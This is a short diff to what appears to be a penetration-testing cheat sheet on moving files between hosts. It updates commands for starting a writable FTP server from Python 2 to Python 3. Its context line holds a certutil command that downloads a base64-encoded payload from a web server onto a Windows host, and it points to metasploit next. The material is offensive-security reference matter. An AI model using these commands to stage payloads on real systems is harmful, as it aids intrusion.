@@ -170,8 +170,8 @@ certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil
 On a linux host start a FTP:
 
 ```text
-apt-get install python-pyftpdlib  
-python -m pyftpdlib -p 21 -w
+apt-get install python3-pyftpdlib  
+python3 -m pyftpdlib -p 21 -w
 ```
 
 Or use metasploit:
